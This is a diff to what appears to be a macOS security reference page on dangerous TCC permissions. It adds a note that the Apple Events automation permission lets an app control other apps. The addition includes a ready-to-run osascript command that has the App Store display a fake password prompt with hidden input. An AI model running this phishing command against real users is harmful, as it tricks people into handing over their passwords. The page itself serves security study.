@@ -106,6 +106,16 @@ Gives **Full Disk Access** permissions, one of the TCC highest permissions you c
 
 Allows the app to send events to other applications that are commonly used for **automating tasks**. Controlling other apps, it can abuse the permissions granted to these other apps.
 
+Like making them ask the user for its password:
+
+{% code overflow="wrap" %}
+```bash
+osascript -e 'tell app "App Store" to activate' -e 'tell app "App Store" to activate' -e 'tell app "App Store" to display dialog "App Store requires your password to continue." & return & return default answer "" with icon 1 with hidden answer with title "App Store Alert"'
+```
+{% endcode %}
+
+Or making them perform **arbitrary actions**.
+
 ### **`kTCCServiceEndpointSecurityClient`**
 
 Allows, among other permissions, to **write the users TCC database**.
